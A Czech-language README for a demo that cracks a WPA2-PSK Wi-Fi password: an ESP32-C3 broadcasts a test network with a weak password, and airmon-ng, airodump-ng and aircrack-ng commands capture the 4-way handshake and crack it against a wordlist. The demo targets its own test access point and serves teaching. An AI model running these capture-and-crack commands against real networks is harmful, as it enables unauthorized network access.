# DEMO 2: Prolamování Wi-Fi (WPA2-PSK 4-way handshake)

Vytvořeno pro Linux

#### 1. Příprava ESP32-C3
1. Nahrajte kód ze složky `esp32_ap/` do desky ESP32-C3 (pomocí Arduino IDE nebo PlatformIO).
2. Po zapnutí ESP32 začne vysílat Wi-Fi síť:
   * **SSID**: `Demo-Crack-WiFi`
   * **Heslo**: `12345678`
   * **Kanál**: 6

#### 2. Živý odposlech z notebooku

Spustěte následující příkazy:

```bash
sudo airmon-ng check kill
```
```bash
sudo airmon-ng start [název vašeho wifi adaptéru]
```
```bash
sudo airodump-ng -c 6 --essid "Demo-Crack-WiFi" -w zive_demo [název vašeho wifi adaptéru]mon
```
```bash
aircrack-ng -w wordlist.txt zive_demo-01.cap
```

#### 3. Připojení telefonu
1. Na mobilním telefonu otevřete nastavení Wi-Fi a připojte se k síti `Demo-Crack-WiFi`.
2. V `airodump-ng` se v pravém horním rohu objeví hlášení: `WPA handshake: <MAC_ESP32>`.
3. V prohlížeči telefonu otevřete adresu `http://192.168.4.1`:
   * Načte se demo stránka, která každé 2.5 sekundy posílá požadavek na `/api/traffic`, což simuluje živý a stabilní síťový provoz.

#### 4. Prolomení živě zachyceného hesla
Ukončete zachytávání (`Ctrl+C`) a spusťte prolomení:
```bash
aircrack-ng -w wordlist.txt zive_demo-01.cap
```
